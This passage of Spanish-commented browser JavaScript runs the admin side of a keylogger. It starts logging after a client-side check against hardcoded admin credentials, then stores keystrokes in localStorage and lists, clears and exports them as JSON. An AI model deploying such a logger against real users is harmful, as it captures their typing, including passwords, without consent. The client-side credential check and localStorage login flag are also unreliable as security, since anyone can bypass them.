username').value;
const password = document.getElementById('password').value;
const loginError = document.getElementById('loginError');

if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
localStorage.setItem('adminLoggedIn', 'true');
showAdminSection();
loginError.style.display = 'none';
startKeylogger();
} else {
loginError.style.display = 'block';
}
}

function logout() {
localStorage.setItem('adminLoggedIn', 'false');
showLoginSection();
stopKeylogger();
}

function showLoginSection() {
document.getElementById('loginSection').style.display = 'block';
document.getElementById('adminSection').classList.add('hidden');
}

function showAdminSection() {
document.getElementById('loginSection').style.display = 'none';
document.getElementById('adminSection').classList.remove('hidden');
loadLogsFromStorage();
updateLogsDisplay();
}

// ==================== GESTIÓN DE REGISTROS ====================

function loadLogsFromStorage() {
const savedLogs = localStorage.getItem('keyLoggerData');
if (savedLogs) {
keyLogs = JSON.parse(savedLogs);
}
}

function saveLogsToStorage() {
localStorage.setItem('keyLoggerData', JSON.stringify(keyLogs));
}

function updateLogsDisplay() {
const logsList = document.getElementById('logsList');

if (keyLogs.length === 0) {
logsList.innerHTML = '<p>No hay registros de teclas aún.</p>';
return;
}

logsList.innerHTML = keyLogs.map(log => `
<div class="log-entry">
<span class="timestamp">[${log.timestamp}]</span>
<strong>Tecla:</strong> "${log.key}"
<strong>Código:</strong> ${log.keyCode || 'N/A'}
</div>
`).join('');
}

function clearLogs() {
if (confirm('¿Estás seguro de que quieres eliminar TODOS los registros?')) {
keyLogs = [];
localStorage.removeItem('keyLoggerData');
updateLogsDisplay();
}
}

function exportLogs() {
const dataStr = JSON.stringify(keyLogs, null, 2);
const dataBlob = new Blob([dataStr], {type: 'application/json'});

const link = document.createElement('a');
link.href = URL.createObjectURL(dataBlob);
link.download = `keylogger-data-${new Date().toISOString().split('T')[0]}.json`;
link.click();
}

// ==================== DETECCIÓN DE CIERRE/CAMBIO DE PÁGINA ====================

window.addEventListener('beforeunload', function() {
saveLogsToStorage();
});

// Recargar logs cuando la página gana visibilidad
document.addEventListener('visibilitychange', function() {
if (!document.hidden && localStorage.getItem('adminLoggedIn') === 'true') {
loadLogsFromStorage();
updateLogsDisplay();
}
});